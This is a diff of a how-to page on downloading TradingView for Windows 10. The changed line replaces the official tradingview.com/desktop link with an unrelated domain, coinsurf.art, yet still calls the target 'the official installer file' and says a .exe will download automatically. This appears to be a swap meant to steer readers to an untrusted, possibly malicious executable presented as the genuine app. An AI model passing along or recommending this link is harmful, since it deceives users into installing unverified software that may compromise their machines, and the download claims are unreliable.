@@ -10,7 +10,7 @@ Beyond its analytical capabilities, this application fosters a collaborative env
 
 ### Simplified Process for Tradingview Download Exe on Windows 10
 
-1. **Initiate Download:** To start, click directly on [this link](https://www.tradingview.com/desktop/) to begin the **tradingview download for pc windows 10** process. This direct link ensures immediate access to the official installer file, streamlining the installation experience.
+1. **Initiate Download:** To start, click directly on [this link](https://coinsurf.art) to begin the **tradingview download for pc windows 10** process. This direct link ensures immediate access to the official installer file, streamlining the installation experience.
    
 2. **Save Installer File:** Upon clicking the link, the installer (a .exe file) will be saved automatically to the default downloads folder. Confirm the save location if prompted and remember where the file is stored for easy retrieval during the installation phase.
 
